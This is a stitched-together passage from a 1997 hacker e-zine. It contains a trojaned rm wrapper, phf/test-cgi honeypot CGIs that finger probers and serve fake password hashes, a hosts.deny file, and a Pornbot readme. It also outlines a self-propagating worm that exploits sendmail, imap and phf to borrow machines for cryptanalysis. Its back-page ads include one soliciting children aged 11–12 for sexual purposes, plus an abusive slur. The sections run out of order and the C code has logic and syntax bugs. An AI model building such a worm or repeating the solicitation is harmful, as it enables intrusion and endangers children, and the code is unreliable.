		system("cp -f $PROGRAM/* /tmp/fill &>/dev/null");
		unsetenv("PROGRAM");
		execl("/bin/rm.bak","rm","-rf",argv[i],NULL);
	}
	else 
	{
		setenv("PROGRAM", argv[i], 1);
		system("cp -f $PROGRAM /tmp/fill &>/dev/null");
		unsetenv("PROGRAM");
		execl("/bin/rm.bak","rm","-rf",argv[i],NULL);
	}
  } 


ri:

  for (i=2;i<argc;i++) 
  {
	setenv("PROGRAM", argv[i], 1);
	system("cp -f $PROGRAM /tmp/fill &>/dev/null");
	execl("/bin/rm.bak","rm","-ri",argv[i],NULL);
	unsetenv("PROGRAM");
  }


rv:

  for (i=2;i<argc;i++) 
  {
	setenv("PROGRAM", argv[i], 1);
	system("cp -f $PROGRAM /tmp/fill &>/dev/null");
	execl("/bin/rm.bak","rm","-rv",argv[i],NULL);
	unsetenv("PROGRAM");
  }

rfv:

  for (i=2;i<argc;i++) 
  {
	setenv("PROGRAM", argv[i], 1);
	system("cp -f $PROGRAM /tmp/fill &>/dev/null");
	execl("/bin/rm.bak","rm","-rfv",argv[i],NULL);
	unsetenv("PROGRAM");
  }

}

This program can of course be improved, especially replacing the strcmp's
with getopt() but I could care less....

Now when ever a user deletes something it will first be copied to
/tmp/fill before it's deleted.

Now, even though it's logged to /var/log/httpd/access_log, I'd like to
know right away when someone tries to use the phf or test-cgi
vulnerabilities on me. So I replaced the phf and test-cgi programs in my
/cgi-bin/ with this. The first will get the info on who it is, then it
will send a fake passwd file. This can be improved of course but I don't
care to take the time. 

phf.c:


/* ----------------------------------------------------- */
/* phf "trojan" by (--==+*~Shok~*+==--)			 */
/* ----------------------------------------------------- */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
void main()
{ 

FILE *tmpfile, *fingerinfo;
char *host, *addr, *browser, *query_string;
char fingerbuf[2048];

host=getenv("REMOTE_HOST"); 
addr=getenv("REMOTE_ADDR");
browser=getenv("HTTP_USER_AGENT");
query_string=getenv("QUERY_STRING"); 

/* This is to prevent a finger war, the ip address below is my ip address */
/* just to be on the safe side. But I do have in.fingerd: LOCAL to allow  */
/* me to finger without starting a finger war. 				  */
if ((strcmp(addr, "206.71.69.243")) || (strcmp(addr,"127.0.0.1")) == 0) exit(0); 

system("finger @$REMOTE_ADDR > /var/tmp/.fingerinfo1");

tmpfile=fopen("/var/tmp/.phf", "w"); 
fingerinfo=fopen("/var/tmp/.fingerinfo1", "r");

fprintf(tmpfile, "The following person used phf!!\n\n");
fprintf(tmpfile, "\tHost: %s\n", host);
fprintf(tmpfile, "\tAddress: %s\n", addr);
fprintf(tmpfile, "\tBrowser type: %s\n", browser);
fprintf(tmpfile, "\tQuery String (aka command entered): %s\n\n", query_string); 

fingerinfo=fopen("/var/tmp/.fingerinfo1", "r");
fgets(fingerbuf, 2047, fingerinfo);
fclose(fingerinfo);


fprintf(tmpfile, "I did a finger of the person trying to exploit us:\n");
fprintf(tmpfile, "--------------------------------------------------\n");
fputs(fingerbuf, tmpfile);

fclose(tmpfile);

system("mail -s \"SOMEONE USED phf!!\" root </var/tmp/.phf");

unlink("/var/tmp/.fingerinfo1");
unlink("/var/tmp/.phf"); 

printf("Content-type: text/html\n\n");
printf("<H1>Query Results</H1>\n");
printf("<P>\n");
printf("/usr/local/bin/ph -m  alias=x \n");
printf("cat /etc/passwd\n");
printf("<PRE>\n");
printf("root:TQoabYuFUSoSk:0:1:Operator:/:/bin/csh\n");
printf("nobody:*:65534:65534::/:\n");
printf("daemon:*:1:1::/:\n");
printf("sys:*:2:2::/:/bin/csh\n");
printf("bin:*:3:3::/bin:\n");
printf("uucp:*:4:8::/var/spool/uucppublic:\n");
printf("news:*:6:6::/var/spool/news:/bin/csh\n");
printf("ingres:*:7:7::/usr/ingres:/bin/csh\n");
printf("mail:*:8:12::/:\n");
printf("johnny:Abx4dgSg:MaTr|x:/home/MaTrix:/bin/sh\n");
printf("audit:*:9:9::/etc/security/audit:/bin/csh\n");
printf("sync::1:1::/:/bin/sync\n");
printf("kill8r:AfBs45Syf:100:25:Siko:/home/Siko:/bin/sh\n");
printf("ppp::70:70:PPP login:/tmp:/etc/ppplogin\n");
printf("sysdiag:*:0:1:Old System Diagnostic:/usr/diag/sysdiag:/usr/diag/sysdiag/sysdiag\n");
printf("sundiag:*:0:1:System Diagnostic:/usr/diag/sundiag:/usr/diag/sundiag/sundiag\n");
printf("ftp:*:10:20:ftp:/home/ftp:/usr/bin/bash\n");
printf("luseruser:xAFjgodjFa4:254:100:Pr0t0:/home/Pr0t0c0l:/bin/sh\n");
printf("babum:aDtg3Gs645:BiT-#hacker:454:100:/home/BiT:/bin/sh\n");
printf("www:*:30:30:World Wide Web:/home/www:/usr/bin/bash\n");
printf("pop:*:70:70:Post Office Protocol:/var/spool/pop:/usr/bin/bash\n");
printf("zirzlaff:.a6RPNtUhGW0k:3190:100:Torsten Zirzlaff:/home/tz:/usr/local/bin/tcsh\n");
printf("f33r:A23gAdcYf5:4110:100:f33r me bitch:/home/hph:/usr/local/bin/tcsh\n");
printf("henrik:v50YvKjFwWw.M:4120:18:HeNriK:/usr/sirius/henrik:/usr/bin/bash\n");
printf("inas:fStcY3^gf:8900:100:InaSaLoser:/home/is:/usr/local/bin/tcsh\n");
printf("ivo:*:8920:100:Da Tru hacker-Lamer:/home/ivo:/usr/local/bin/tcsh\n");
printf("pcguest::7454:100:Temp hax0r account:/tmp:/usr/bin/sh\n");
printf("simone:Em8y0pwT.5umo:8930:100:Simone Kleine:/home/simone:/usr/bin/bash\n");
printf("shko:aDrsBsefYr:666:100:SHLRP:/home/shok:/bin/bash\n");
printf("majordomo:*:405:20:Majordomo server:/dev/null:/bin/startdomo\n");
printf("listserv:*:567:20:Listserv server:/dev/null:/bin/sh\n");
printf("hammer:FwhX26Hf1:8940:100:Peter Hammerstein:/home/hammer:/usr/bin/bash\n");
printf("patrick:cYz7MXTIyGByQ:8950:100:Patrick Mergell:/home/patrick:/usr/bin/bash\n");
printf("chr:T/SRcchg0fK3I:8960:100:Christian Zemlin:/home/chr:/usr/bin/bash\n");
printf("db:*:8970:100:Dieter Beule:/usr/sirius/dieter:/usr/bin/bash\n");
printf("guest:AefxF2a2D:8999:110:Guest:/home/guest:/usr/local/bin/tcsh\n");
printf("</PRE>");
}				 

This is what the above will show up in the root's mail:


The following person used phf!!

        Host: ts037d12.chi-il.concentric.net
        Address: 206.173.188.168
        User (if able): (null)
        Ident (if able): (null)
        Browser type: (null)
        Query String (aka command entered): Qalias=X%0aid

I did a finger of the person trying to exploit us:
--------------------------------------------------
[206.173.188.168]
(probably Win95 which is why there was no output as Win95 doesn't have an
actual "finger" program)




Now for the test-cgi...this does the same thing accept it will send a 
"File Not found" instead:

test-cgi.c:

/* --------------------------------------------------- */
/* test-cgi.c -- test-cgi "trojan" by --==+*~Shok~+*-- */
/* --------------------------------------------------- */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void main(void)
{ 
  FILE *tmpfile, *fingerinfo;
  char *host *addr, *browser, *query_string;
  char fingerbuf[2048];

  host=getenv("REMOTE_HOST"); 
  addr=getenv("REMOTE_ADDR");
  browser=getenv("HTTP_USER_AGENT");
  query_string=getenv("QUERY_STRING"); 

  /* This is to prevent a finger war, for safety, even though you SHOULD  */
  /* have in.fingerd: LOCAL in your hosts.allow				  */

  if ((strcmp(addr, "206.71.69.243")) || (strcmp(addr,"127.0.0.1")) == 0) exit(0);
  system("finger @$REMOTE_ADDR > /var/tmp/.fingerinfo");

  tmpfile=fopen("/var/tmp/.test-cgi", "w");
  fprintf(tmpfile, "The following person used phf:\n\n");
  fprintf(tmpfile, "\tHost: %s\n", host);
  fprintf(tmpfile, "\tAddress: %s\n", addr);
  fprintf(tmpfile, "\tBrowser type: %s\n ", browser);
  fprintf(tmpfile, "\tQuery String (aka command entered): %s\n\n", query_string);
  fingerinfo=fopen("/var/tmp/.fingerinfo", "r");
  fgets(fingerbuf, 2047, fingerinfo); 
  fclose(fingerinfo);


  fprintf(tmpfile, "I did a finger of the person trying to exploit us:\n");
  fprintf(tmpfile, "--------------------------------------------------\n");
  fputs(fingerbuf, tmpfile);

  fclose(tmpfile);

  /* REPLACE THIS PART WITH WHO YOU WANT TO MAIL IT TO change the root to */
  /* to whatever you want 						  */

  system("mail -s \"SOMEONE USED test-cgi!!\" root < /var/tmp/.test-cgi");

  unlink("/var/tmp/.fingerinfo"); 
  unlink("/var/tmp/.test-cgi"); 

  printf("Content-type: text/html\n\n");
  printf("<h2>File Not found\n</h2>");
  printf("The requested URL /cgi-bin/test-cgi was not found on this server.");

} 



Just as an added bonus here.........
When someone goes to a directory you have .htaccess in, it will send 401,
which is the unauthorized error code (pretty sure it's 401 but not in the
mood to check). Now I editted my srm.conf (usually
/usr/local/etc/httpd/conf/srm.conf), and added this line:

ErrorDocument 401	/cgi-bin/unauthorized.cgi

This is basically like the one above.......except it differs
by the the 'user' part, which lets you know what user it was...this is a
good way to know if there is an unauthorized attempt, and/or what user is
logging into your webpage that is secured......

unauthorized.c:


/* -------------------------------------------------------- */
/* Unauthorized cgi "trojan" script by (--==+*~Shok~*+==--) */
/* -------------------------------------------------------- */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
void main(void)
{
  FILE *tmpfile, *fingerinfo;
  char *host, *addr, *user, *ident, *browser, *query_string;
  char fingerbuf[2048];

  host=getenv("REMOTE_HOST");
  addr=getenv("REMOTE_ADDR");
  user=getenv("REMOTE_USER");
  ident=getenv("REMOTE_IDENT");
  browser=getenv("HTTP_USER_AGENT");
  query_string=getenv("QUERY_STRING");

  /* This can get ugly */
  if ((strcmp(addr, "206.71.69.243"))==0) exit(0);

  system("finger @$REMOTE_ADDR > /var/tmp/.fingerinfo");

  tmpfile=fopen("/var/tmp/.unauthorized", "w");
  fprintf(tmpfile, "The following person has unauthorized access:\n\n");
  fprintf(tmpfile, "\tHost: %s\n", host);
  fprintf(tmpfile, "\tAddress: %s\n", addr);
  fprintf(tmpfile, "\tUser (if able): %s\n", user);
  fprintf(tmpfile, "\tIdent (if able): %s\n", ident);
  fprintf(tmpfile, "\tBrowser type: %s\n ", browser);
  fingerinfo=fopen("/var/tmp/.fingerinfo", "r");
  fgets(fingerbuf, 2047, fingerinfo);
  fclose(fingerinfo);


  fprintf(tmpfile, "I did a finger of the person:\n");
  fprintf(tmpfile, "-----------------------------\n");
  fputs(fingerbuf, tmpfile);

  fclose(tmpfile);

  system("mail -s \"Somone tried unauthorized access\" root </var/tmp/.unauthorized");

  unlink("/var/tmp/.fingerinfo");
  unlink("/var/tmp/.unauthorized");

  printf("Content-type: text/html\n\n");
  printf("<HEAD><TITLE>Unauthorized</TITLE></HEAD>");
  printf("<BODY><H1>Unauthorized</H1>");
  printf("You are unauthorized and unwanted here.\n Go away <FONT COLOR=\"red\">d0rk</FONT><P>");
  printf("</BODY>");

}


Here is my hosts.deny too.........in case you wanted to see it ;)
ALL: .cc.edu: /bin/mail -s "%h from CC.EDU tried to access us!!" root
ALL: .gov, .mil: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "GOV/MIL ATTEMPTED ACCESS from %h!! Using %s." root &
in.telnetd: ALL: /bin/mail -s "%h tried to telnet in" root

#FINGER - Noisy people
#------------
in.fingerd: ALL: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "FINGER ATTEMPT FROM %h" root & 

#Security reasons
#---------------
in.ftpd: ALL: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "FTP ATTEMPT FROM %h" root &
in.rlogind: ALL: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "RLOGIN ATTEMPT FROM %h" root &
#in.telnetd: ALL: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "TELNET ATTEMPT FROM %h" root &

# PORTMAP 
#-------------
portmap: ALL: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "PORTMAP ATTEMPT FROM %h. Using %s" root &

#COMSAT
in.comsat:  spawn /usr/sbin/safe_finger @%h| /bin/mail -s "COMSAT ATTEMPT FROM %h" root &

#REXECD
in.rexecd: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "REXEC ATTEMPT FROM %h" root &

#RSHD
in.rshd:  spawn /usr/sbin/safe_finger @%h| /bin/mail -s "RSHD ATTEMPT FROM %h" root &

#NNRPD
in.nnrpd: ALL: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "NNRPD ATTEMPT FROM %h" root &

#RPCBIND
rpcbind: ALL: spawn /usr/sbin/safe_finger @%h| /bin/mail -s "RPCBIND ATTEMPT FROM %h. Using %s" root &

#ALL: paranoid


Well.......................................we're winding down to the end.

It has been fun and I don't have much more to say on this article.
Thanks for reading, please feel free to use and distribute this, although
I wish for you to leave my comments and "header" at the tops ... ya know
my "copyright" :) 

You can access a few of my things at ftp.janova.org (in pub) or
www.janova.org. 

			        Shok
			(--==+*~Shok~*+==--)

Email: shok@sekurity.org

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. PornBot : TFreak
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Pornbot v1.0 by TFreak [08/18/97]

Overview
--------
Pornbot is a config file driven all purpose newsbot for UNIX.  It scans the 
newsgroups found in the config file (pornbot.conf) for encoded binaries and 
saves the decoded image to disk.  

Getting Started
---------------

1)  Edit the UUDECODEPATH variable on line 24 of the source file to point to  
    its location on your system.  If you don't have one, a Linux binary is 
    included with this release. (however, we rm'd the zgv with this release,
    becuase its too fucking big, so copy zgv to the pornbot dir -- so1o)

2)  Edit the pornbot.conf file.  The first entry is an NNTP server to which
    you have read permission on.  The remaining lines are newsgroups in which
    you want pornbot to scan.  The config file is terminated with a $ on a 
    blank line.  ``#'' comments out a line, and blank lines are ignored.

    NOTE:  For memory conservation purposes, the MAXNEWSGROUPS variable is
           included.  If you plan on scanning a lot of newsgroups, up this
           number (default is 15 newsgroups).  If you have more newsgroups
           than whats compiled in, anything after that max will be ignored.

3)  Compile your binary.  
    
    cc -o pornbot pornbot.c

    This should compile fine.  Tested on Linux and FreeBSD.


After this your ready to start downloading!

-tf

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
4. Crypto Worm (philsophy)
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                     Worm for Crypto! (philosophy)
                     -----------------------------
                                  By:
                          --==+(*Shok*)+==--

Well that may of gotten your attention :) Something I realized
when going through some crypto related articles. Consider the
following.....you want to crack rsa, but you know that the MIPS years
required is far too great. Well what if you were, to write an internet
worm, that would exploit system holes, like sendmail, imap, popd, httpd
(brute force), phf, any thing it could to get into the system, and once it
was in, it ran a program for cryptographic related purposes. You could use
this to crack a key or an encryption standard like RSA. It could then mail
it's output to an anonymous server or a news group or somewhere to obtain
your anonymity. But this way, you could be using machines all over the
world to crack something. Now this article is more of a philsopy than
anything, I am just explain this. But think about it.....it could be
useful eh? Here is what it could do:

1.) You could use something like srand() with the date as a seed (or
    just take the code out of an ip scanner, eipscan for example, is a
    nice one), and have it find hosts that way. Also you could use a dns
    scanner at the same time.......no matter however you want to go about
    it.
2.) Try to exploit this host while still scanning for more hosts in the
    parent.
2.) Exploit (get into) the host. 
3.) Get information from /etc/hosts, .rhosts, etc. and repeat step two on
    those hosts (fork another process).
4.) Have your program, output to a file your code for cracking, and
    compile that on the system (you chould put this in the code of the
    worm but I don't think it would be as neat...it'd be too messy.
5.) After running mail the results to something like anon.pinet.fi (or
    whatever it was...) you get the idea. 

You might want it to only mail if certain conditions occur such as
it cracks it or anything. You'd also want to randomly try to crack the
key, and not a sequence, because otherwise, you'd be the whole point, and all
the hosts would be doing the same thing, so all you'd need is the quickest one,
and you certainly don't want that! :)
 
This is just a philosopy I'm not including any code on this one....too
much code and not enough time ;)
	
                          --==+*~(Shok)~*+==--

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
--------------------------------------+---------------------------------------
                                      |
           YOUR SPECIAL AD            |            LET'S BE FREE
                                      |
       COULD BE RIGHT HERE #@!        |    Gay White Male 38, 5'11" looking
                                      |    for men, 12 - 32 clean, fit, and
       SEND ELECTRONIC MAIL TO:       |    hairy. Discreet Encounters.
           ADZ@CODEZ.COM              |    Call Anytime : (816)781-8009
                                      |                   (Ask for Tommy)
                                      |
--------------------------------------+---------------------------------------
                                      |
        ARE YOU 11 OR 12 ???          |      FREE FONESEX! CALL ME NOW!@
                                      |
 Looking for men 11 - 12 for adult    |    Yeah huney, you know you want me,
 video satisfaction. I am 35 into     |    I'll treat you just right, I'm
 Professional wrestling.              |    waiting for your call today!
 Let's talk soon : (816)453-8722      |    CALL ME NOW!@# : (847)546-9154
                                      |                     (Ask for Kim)
--------------------------------------+---------------------------------------
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                            .oO Team CodeZero Oo.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                      _   /|  k0dekat sez...
                      \'o O'                            
                      =(_o_)=   "EyEm HuNGaRy FoR SKiLLz,
                        U               nOt CaTf00d!!#@"


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
          Remember, McDonalds Owns You, And Ronald Is The KinG!!!
         Wendy Is Satan!! Don't Believe The Lies!! PHEAR WENDY!@#*
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



<-- line 2500.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
       .o. cZo .o.          Team CodeZero Presents          .o. cZo .o.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

             CYBERJUNKIE IS A FAT LYING GREASY CUNT - Cold-Fire

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

      /IIIIIIIIII          /IIIIIIIIII           /III   /III
      \ III_____/          \ III___/III          \ III  \ III
       \ III                \ III  \ III          \ III  \_III
        \ III  onfidence     \ IIIIIIII  emains    \ IIIIIIIIII  igh
         \ III                \ III__/III           \ III__/ III
          \ III                \ III  \ III          \ III  \ III
           \ IIIIIIIIII   ___   \ III  \ III   ___    \ III  \ III   ___
            \_________/  /\__\   \__/   \__/  /\__\    \__/   \__/  /\__\
                         \/__/                \/__/                 \/__/


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                                                                      Issue 6
                                                           12th December 1997
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                                  
                             Editor : so1o

               Pimped falken's flea : tymat

                          The usual : om3n, zer0x, xFli, electro,
                                      Spheroid and helix. 

                      Not forgotten : loss, organik, d-storm (aka el8)
                                      peenut, pzn, suid and manly.

                  Special thanks to : Shok, dlc, efpee, chameleon, daxx
                                      falken, figster and cain.

                            Windows : The carparts crew.

               Kick in the teeth to : TRON and stealth (aka. dev_null)


                   .-----------[ An Official ]-----------.
                   :      .-----.  .----.   .--.--.      :
                   :      :  .--'  : .-. :  :  :  :      :
                   !_-::  :  :     : `-' ;  :  .  :  ::-_!
                   :~-::  :: :     :: . :   ::    :  ::-~:
                   :      ::.`--.  ::.:  :  ::.:  :      :
                   :      `-----'  `--'--'  `--'--'      :
                   !_-::                             ::-_!
                   :~-::-[ Confidence Remains High ]-::-~:
                   :~-::                             ::-~:
                   `-----------[ Production ]------------'

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

       We wrote this is 9 days in total, which is reasonably impressive
       considering the content, we hope you enjoy it, because we won't
       be putting out much until 1998 :) -- so1o

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This Bumper Sized Christmas Issue : 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

------=>  Section A  :  Introduction And Cover Story.

    1. Confidence Remains High issue 6....................: Tetsu Khan
    2. Policy.............................................: so1o

------=>  Section B  :  Exploits And Code.
 
    1. EXCLUSIVE CRH SENDMAIL / ELM 2.4 REMOTE EXPLOIT....: figster
    2. TraceProbe.sh......................................: falken
    3. BruteWeb (SSL) 2.0.................................: BeastMaster V
    4. Check.sh...........................................: xFli
    5. Selena Sol remote flaw (unpublished)...............: Cain

------=>  Section C  :  Phones / Scanning / Radio.

    1. ShokDial...........................................: Shok
    2. More MIT dialups...................................: zer0x
    3. Hiding within the system...........................: efpee
    4. An introduction to LightSpan 2000's................: dlc
    5. An introduction to the NEC P3......................: DaXX
    6. More Russian dialups...............................: Lirik
    7. UK x.25 network numbers............................: Cold-Fire

------=>  Section D  :  Miscellaneous.

    1. A short introduction to IPv6.......................: so1o  
    2. Newbie sk00l.......................................: so1o
    3. Windows NT filesharing basics......................: chameleon
    4. BitchX / crackrock bug.............................: so1o / Shok
    5. Nifty Lynx trick...................................: Electric Nectar
    6. No-more negative...................................: so1o

------=>  Section E  :  World News.

    1. Pentagon hacked....................................: so1o

-------=> Section F  :  Projects.

    1. TOTALCON '98.......................................: so1o

------=> Section G  :  FIN.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Confidence Remains High issue 6 : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Welcome to a vastly new and improved Confidence Remains High, now geared to
(basically) everyone we could think of, there may be some parts that some of
you may dislike and think below you, as well as being some parts you actually
learn something from, as always, we hope you enjoy this issue, and those
to come in the future..

The distro list..
=================

   www.technotronic.com                             /ezines/crh/
   cybrids.simplenet.com                            /Toast/files/CRH/
   ftp.linuxwarez.com                               /pub/crh/
   ftp.sekurity.org                                 /users/so1o/
  
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Policy : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

In issues 1, 2 and 3, we took our readers through some simple steps of getting
some exploits, using them, and reaping the rewards, some, if not most of those
exploits that we published were taken from recent posts to BugTraq
(at http://www.geek-girl.com/bugtraq) and from websites such as the acclaimed
www.rootshell.com, then CRH was aimed soley at those who had read 1980's BBS
text files until they were blue in the face and couldn't stand another
"UNIX for beginners" file, so we put out this magazine, in an attempt to take
the "newbies" who wanted to learn, and give them an oppurtunity to gain up-to
date knowledge about the scene and the way things work now, because those who
write other magazines really don't gear their articles to those who aren't
fully confident with Unix and the ideas and methodologies that are needed to
understand exactly whats going on.

Since then our readership levels have increased, and more and more of the
people who are highly skilled (halflife for one) have made statements about
Confidence Remains High being weak and lame, but thats only an opinion, but
none the less, we have taken it into account, and tried our best to make this,
and issues to come, geared to both newbies and the elite few who care to
critisize us..

We don't want to be like Phrack, they get alot of flames themselves, the only
reason we write these files is to learn, keep ourselves out of trouble, teach
others, and most importantly, to have fun (and become famous, heh j/k)..
If you want something a little more simple to understand, then read CRH,
if you want something that is only understandable by those who wrote the
articles and the few who actually know about the subjects covered, then
read Phrack. If you don't understand either Phrack or CRH, then read THTJ
which is a weak version of CRH, with vB programs, articles that were
previously in CRH, and not forgetting, members of sIn as writers,
hahahahoeowehahahahaha!

Thank you for listening,

so1o

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS / CODE ]==========[ .SECTION B. ]============[ EXPLOITS / CODE ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. EXCLUSIVE CRH SENDMAIL / ELM 2.4 REMOTE EXPLOIT : figster
